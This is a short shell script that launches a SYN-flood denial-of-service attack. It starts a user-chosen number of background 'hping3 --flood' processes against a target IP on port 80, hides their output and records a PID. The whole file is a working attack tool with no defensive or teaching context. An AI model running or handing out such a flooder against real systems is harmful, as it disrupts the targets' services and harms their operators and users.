#!/bin/sh

blanc='\e[1;37m'
orange='\e[0;33m'


hpingX_ns()
{
  ip=$ip
  port=$port
  nb=$nb
  printf "${orange}Starting hping3 \n"
  inc=0
  while ((inc!=nb))
  do
      sudo hping3 -S $ip -p 80 --flood >/dev/null 2> /dev/null & 
      let "inc=inc+1"
  done
  echo $$ > pid.txt
}

echo "" > pid.txt
ip=$1
port=$2
nb=$3
hpingX_ns $ip $port $nb